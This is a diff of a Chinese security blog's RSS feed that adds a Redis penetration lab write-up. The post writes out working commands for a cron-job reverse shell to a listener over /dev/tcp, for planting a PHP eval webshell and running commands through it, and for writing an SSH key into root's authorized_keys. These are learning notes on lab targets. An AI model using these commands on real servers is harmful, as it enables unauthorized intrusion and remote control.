@@ -1,5 +1,189 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:31:44 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>PostgreSQL数据库渗透</title><link>https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html</link><description>命令行连接方式
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:33:11 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>Redis渗透</title><link>https://P7IVESC.github.io/post/Redis-shen-tou.html</link><description>## Redis未授权访问漏洞
+
+## Redis本地检查
+
+在本地使用redis-cli连接
+
+```bash
+redis-cli
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/09f180a5ef8b.png)
+
+检查配置项
+
+```bash
+config get requirepass
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0e7434731575.png)
+
+## curl命令测试
+
+```bash
+curl dict://10.3.4.101:6379/info
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/913d91e65afd.webp)
+
+## 客户端访问测试
+
+```bash
+redis-cli -h 10.3.4.101
+get *
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/18cceb0e8367.webp)
+
+## fscan扫描测试
+
+```bash
+.\fscan64.exe -h 10.3.4.101
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b5714c52a99f.png)
+
+## msf扫描测试
+
+```bash
+use auxiliary/scanner/redis/redis_login
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3c694d7c5438.png)
+
+## Redis反弹shell
+
+**1.本地开启端口监听**
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dcd394d4901b.png)
+
+**2.通过Redis写入功能将反弹shell写入定时任务中**
+
+```sql
+flushall
+--清除所有数据库的所有key
+set x '\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.11.109/1234 0&gt;&amp;1\n'
+--创建一个key-value对，键名为“x”，值为要写入的定时任务的内容
+config set dir /var/spool/cron
+--指定数据存储的路径
+config set dbfilename root
+--指定数据存储的文件名
+save
+--存储数据
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3000e1b44672.png)
+
+**3.接收到shell**
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cdec7cc55b75.webp)
+
+## Redis写入Webshell
+
+**通过Redis将webshell写入Web目录下**
+
+```bash
+redis-cli -h 10.3.4.129
+10.3.4.129:6379&gt; set webshell '\n\n\n&lt;?php eval($_REQUEST[1]); ?&gt;\n'
+OK
+(3.15s)
+10.3.4.129:6379&gt; config set dir /var/www/html
+OK
+10.3.4.129:6379&gt; config set dbfilename shell.php
+OK
+(2.93s)
+10.3.4.129:6379&gt; save
+OK
+(0.78s)
+10.3.4.129:6379&gt; exit
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/97616281a64d.png)
+
+**访问Webshell并执行命令**
+
+```bash
+curl 'http://10.3.4.129/shell.php?1=system('id');' --output -
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/73bd33c28482.png)
+
+## Redis SSH公钥利用
+
+## SSH登录方式
+
+ssh [-p port] user@192.168.1.2 //使用用户名密码登录
+
+ssh -i id_rsa root@192.168.1.2 //使用私钥登录
+
+**私钥的生成**
+
+ssh-keygen -t rsa
+
+cd /root/.ssh
+
+cp id_rsa.pub authorized_keys
+
+chmod +x authorized_keys
+
+cat id_rsa
+
+将里面的内容复制到本机,命名为id_rsa //其中id_rsa为私钥 id_rsa.pub为公钥
+
+## 生成SSH密钥对
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a802d08b5b39.png)
+
+## 写入SSH公钥
+
+通过Redis将SSH公钥写入authorized_keys文件中
+
+```bash
+cat /root/.ssh/id_ed25519.pub
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b0fed1072ad.png)
+
+```bash
+redis-cli -h 10.3.4.131
+10.3.4.131:6379&gt; config set dir /root/.ssh
+OK
+(1.98s)
+10.3.4.131:6379&gt; config set dbfilename authorized_keys
+OK
+10.3.4.131:6379&gt; set x '\n\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATN5mrkJygxFDJ5hvlNFGyFxV65soDbpwQjxHhcU17Q root@kali\n\n'
+OK
+10.3.4.131:6379&gt; save
+OK
+10.3.4.131:6379&gt;
+```
+
+```
+由于公用靶场容易影响，后面是本地部署靶场，命令相同
+```
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/931a65c52a80.webp)
+
+## Redis主从复制利用
+
+• 定时任务反弹shell
+
+条件：存在定时任务服务
+
+• Webshell写入
+
+条件：存在Web服务，且知道Web路径
+
+• SSH公钥写入
+
+条件：存在SSH服务，且存在.ssh文件夹
+
+在docker环境中，仅有纯净的Redis服务时，无法通过文件写入的方式getshell
+
+在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov提出
+
+了一种Redis新版本的Getshell方式，即利用Redis主从节点的同步功能。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/Redis-shen-tou.html</guid><pubDate>Fri, 06 Nov 2026 03:32:36 +0000</pubDate></item><item><title>PostgreSQL数据库渗透</title><link>https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html</link><description>命令行连接方式
 
 安装客户端
 
